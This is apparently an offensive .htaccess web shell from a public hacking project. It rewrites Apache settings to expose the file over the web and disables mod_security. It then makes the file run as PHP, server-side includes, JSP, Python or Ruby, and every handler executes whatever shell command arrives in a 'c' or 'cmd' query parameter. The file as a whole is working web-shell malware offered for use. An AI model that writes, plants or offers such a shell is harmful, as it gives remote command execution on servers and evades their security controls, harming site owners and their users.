# <!--
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
</Files>

# Turn off hardening/security settings
<IfModule mod_security.c>
    SecFilterEngine Off
</IfModule>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
# the apache directoves from the .htaccess file
<IfModule mod_php5.c>
    AddType application/x-httpd-php .htaccess
</IfModule>
<IfModule mod_php4.c>
    AddType application/x-httpd-php .htaccess
</IfModule>
<IfModule mod_php3.c>
    AddType application/x-httpd-php .htaccess
</IfModule>
<IfModule mod_php6.c>
    AddType application/x-httpd-php .htaccess
</IfModule>
<IfModule mod_suphp.c>
    AddType application/x-httpd-suphp .htaccess
</IfModule>

# <?php echo "--".chr(62)."\n";passthru($_GET['c']." 2>&1"); echo "\x3c!--"; ?>

<IfModule mod_include.c>
# Enable serverside includes with exec functionality
    Options +Includes

#Make apache treat .htaccess as a server side include file
    AddType text/html .htaccess
    AddHandler text/html .htaccess
    AddOutputFilter INCLUDES .htaccess
</IfModule>
# <!--#exec cmd='echo -e "--\x3e"' --><!--#if expr="$QUERY_STRING_UNESCAPED = /^c=(.*)$/" --><!--#set var="cmd" value="$1 2>&1" --><!--#else --><!--#set var="cmd" value="echo 'Regex failed'" --><!--#endif --><!--#exec cmd="$cmd"--><!--
<IfModule mod_cacuho.c>
    AddHandler caucho-request .htaccess
</IfModule>
#<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.io.*"/><jsp:scriptlet>String cmd = request.getParameter("cmd");String output = "";Process p = null;String s = null;try {if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1){p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);}else{p = Runtime.getRuntime().exec( cmd );}BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine()) != null) {out.println( s );}}catch(IOException e) {out.println( e );}}</jsp:scriptlet></jsp:root>
# --><!--
# --><!--
<IfModule mod_python.c>
  AddType text/html .htaccess
  AddHandler mod_python .htaccess
  AddHandler mod_python .psp
  PythonHandler mod_python.psp
  PythonDebug On
</IfModule>
# <% import commands %>
# <%="--\x3e" %>
#<%=commands.getstatusoutput(form["c"]) %><!--
# --><!--
# Commented ruby out by using <!ruby instead of the percentage sign as mod_python and mod_ruby clash
<IfModule mod_ruby.c>
   RubyRequire apache/erb-run
   RubySafeLevel 0
   AddType text/html .htaccess
   #<Files *.htaccess>
   #  SetHandler ruby-object
   #  RubyHandler Apache::ERbRun.instance
   #</Files>
</IfModule>
# <!ruby puts "--\x3e";require 'cgi';cgi=CGI.new;cmd=cgi["c"];cmd.untaint;puts `#{cmd}` !><!--
# -->
